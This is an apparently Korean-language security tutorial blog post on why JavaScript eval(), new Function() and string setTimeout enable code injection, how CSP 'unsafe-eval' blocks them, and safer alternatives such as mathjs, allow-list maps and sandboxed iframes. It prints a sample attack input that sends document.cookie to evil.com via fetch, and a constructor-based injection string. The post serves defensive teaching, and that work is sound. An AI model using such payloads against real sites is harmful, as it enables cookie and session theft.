---
title: "eval과 new Function의 보안 위험"
description: "eval()·new Function()·setTimeout(string)이 코드 주입 취약점이 되는 원리, CSP의 unsafe-eval 연관성, 안전한 수식 계산 대안, iframe sandbox 격리 패턴을 정리합니다."
author: "PALDYN Team"
pubDate: "2026-05-22"
archiveOrder: 9
type: "knowledge"
category: "JavaScript"
tags: ["JavaScript", "보안", "eval", "new Function", "코드주입", "CSP", "unsafe-eval"]
featured: false
draft: false
---

[지난 글](/posts/sec-oauth-client-flows/)에서 OAuth 2.0 클라이언트 흐름을 살펴봤습니다. 이번에는 JavaScript에서 "문자열을 코드로 실행"하는 API들이 어떻게 보안 취약점이 되는지, 그리고 어떤 대안이 있는지 정리합니다.

## 동적 코드 실행 API

JavaScript에는 문자열을 코드로 실행하는 여러 방법이 있습니다.

```js
// 1. eval — 직접 실행
eval('alert(1)');

// 2. new Function — 함수 생성
const fn = new Function('x', 'return x * 2');
fn(5); // 10

// 3. setTimeout/setInterval 문자열 형태
setTimeout('console.log("hello")', 0);

// 4. script 태그 동적 삽입
const s = document.createElement('script');
s.textContent = code;
document.body.appendChild(s);
```

이 중 `eval`과 `new Function`이 가장 주의를 요합니다.

## 왜 위험한가

![eval()과 동적 코드 실행의 위험](/assets/posts/sec-eval-function-risk-attacks.svg)

핵심 위험은 **사용자가 제어하는 문자열이 실행 가능한 코드가 된다는 점**입니다.

수식 계산 기능을 `eval`로 구현한다고 가정합니다.

```js
// 사용자가 계산기에 입력한 수식 계산
function calculate(expr) {
  return eval(expr);  // 절대 이렇게 하면 안 됨
}
```

정상 입력인 `"2 + 3"`은 5를 반환하지만, 공격 입력인 `"fetch('https://evil.com?c='+document.cookie)"`는 쿠키를 탈취합니다.

`new Function`도 동일합니다. `eval`과 다른 점은 호출 시점의 스코프 변수에 접근할 수 없다는 것뿐이고, 전역 변수(`window`, `document`)에는 여전히 접근 가능합니다.

```js
const fn = new Function('return document.cookie');
fn(); // 쿠키 탈취 가능
```

## CSP와 eval의 관계

CSP의 `script-src`에 `'unsafe-eval'`이 없으면 `eval()`·`new Function()`·`setTimeout(문자열)`이 **모두 런타임 에러**로 차단됩니다.

```
EvalError: Refused to evaluate a string as JavaScript because
'unsafe-eval' is not an allowed source of script in the
Content-Security-Policy directive.
```

이는 XSS로 삽입된 코드가 `eval`을 사용하더라도 CSP가 차단할 수 있음을 의미합니다. 그러나 CSP 없이 `eval`을 사용하는 것 자체가 위험한 습관이므로, 처음부터 `eval`을 사용하지 않는 것이 최선입니다.

## 성능 문제

보안 외에도 `eval`은 성능상 문제가 있습니다.

- JavaScript 엔진이 `eval` 내부의 코드를 **컴파일 시점에 최적화**할 수 없습니다.
- `eval`이 있는 함수 스코프 전체의 최적화가 제한됩니다.
- V8의 JIT 컴파일러는 `eval`이 있으면 해당 함수를 **인터프리터 모드**로 실행합니다.

## 안전한 대안

![수식 계산 — eval 없이 안전하게](/assets/posts/sec-eval-function-risk-safe.svg)

### 수식 계산 — 화이트리스트 파서

사용자 입력을 코드로 실행하지 않고, 허용된 문자만 통과시킨 뒤 직접 파싱합니다.

```js
// math.js 라이브러리 사용 — eval 없는 수식 파서
import { evaluate } from 'mathjs';

evaluate('2 + 3');           // 5
evaluate('sin(pi / 2)');     // 1
evaluate('fetch(...)');      // 에러 — 수식이 아님
```

`mathjs`는 내부적으로 토크나이저와 AST를 사용해 수학 표현식만 파싱하므로 코드 주입이 불가능합니다. `expr-eval` 라이브러리도 유사한 목적으로 사용합니다.

### 동적 함수 실행 — 허용 목록 Map

사용자가 함수 이름을 선택할 수 있는 경우, 허용된 함수만 Map에 넣고 꺼내 씁니다.

```js
const ALLOWED_TRANSFORMS = {
  uppercase: s => s.toUpperCase(),
  lowercase: s => s.toLowerCase(),
  reverse: s => s.split('').reverse().join(''),
  trim: s => s.trim(),
};

function applyTransform(name, value) {
  const fn = ALLOWED_TRANSFORMS[name];
  if (!fn) throw new Error(`Unknown transform: ${name}`);
  return fn(value);
}

// 사용자가 'uppercase' 입력 → 허용
// 사용자가 'constructor.constructor("alert(1)")()' 입력 → 에러
applyTransform(userInput, someValue);
```

### 플러그인/규칙 엔진 — iframe 격리

사용자가 자유로운 코드 스니펫을 실행해야 하는 플러그인 시스템(노트북 앱, 로우코드 플랫폼 등)은 `sandbox` 속성이 있는 `<iframe>`에서 격리 실행합니다.

```js
// postMessage 기반 샌드박스
const iframe = document.getElementById('sandbox');

window.addEventListener('message', (e) => {
  if (e.source !== iframe.contentWindow) return;
  // 실행 결과만 받음 (DOM 접근 불가)
  displayResult(e.data.result);
});

function runInSandbox(code) {
  iframe.contentWindow.postMessage({ code }, '*');
}
```

샌드박스 iframe은 부모 DOM에 접근할 수 없고, `allow-scripts`만 허용하면 쿠키·스토리지·네트워크 요청도 제한됩니다.

### Worker에서 실행

Web Worker는 메인 스레드의 DOM에 접근할 수 없어 격리 환경으로 활용할 수 있습니다.

```js
const worker = new Worker('/sandbox-worker.js');
worker.postMessage({ code: userCode });
worker.onmessage = (e) => displayResult(e.data);

// sandbox-worker.js
self.onmessage = ({ data: { code } }) => {
  try {
    // Worker에서는 document, window DOM API 없음
    const result = eval(code);  // 여전히 위험하지만 격리됨
    self.postMessage({ result });
  } catch (err) {
    self.postMessage({ error: err.message });
  }
};
```

완전한 격리를 위해서는 iframe sandbox 방식이 더 안전합니다.

## 정리 — eval 사용 기준

| 상황 | 권장 |
|---|---|
| 사용자 입력 계산 | mathjs, expr-eval 사용 |
| 동적 함수 선택 | 허용 목록 Map |
| JSON 파싱 | `JSON.parse()` (절대 `eval` 금지) |
| 플러그인 실행 | iframe sandbox 또는 Web Worker |
| 템플릿 처리 | Handlebars, Mustache 같은 안전한 템플릿 엔진 |

`eval`을 쓰지 않는 것이 원칙입니다. 다음 글에서는 JavaScript 특유의 취약점인 프로토타입 오염(Prototype Pollution)을 살펴봅니다.

---

**지난 글:** [OAuth 2.0 클라이언트 흐름 — PKCE와 Authorization Code](/posts/sec-oauth-client-flows/)

**다음 글:** [프로토타입 오염 — Prototype Pollution 공격과 방어](/posts/sec-prototype-pollution/)

<br>
읽어주셔서 감사합니다. 😊
